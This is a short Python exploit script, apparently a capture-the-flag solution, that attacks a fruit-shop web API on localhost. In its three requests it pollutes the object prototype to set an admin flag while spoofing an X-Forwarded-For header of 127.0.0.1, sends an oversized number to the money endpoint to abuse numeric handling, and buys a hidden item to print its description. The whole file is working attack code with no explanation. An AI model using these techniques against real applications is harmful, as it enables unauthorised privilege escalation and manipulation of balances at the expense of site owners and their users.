import requests

s = requests.Session()

print(s.post('http://localhost:3000/api/v1/sell', headers={'X-Forwarded-For': '127.0.0.1'}, json={'__proto__': {'admin': 'gg'}, 'mango': { 'quantity': 1 }}).text)
print(s.post('http://localhost:3000/api/v1/money',json={ 'money': 2.5e+25 + 1 }).text)
print(s.post('http://localhost:3000/api/v1/buy', json={ 'fruit': 'grass', 'quantity': 1 } ).json()['description'])
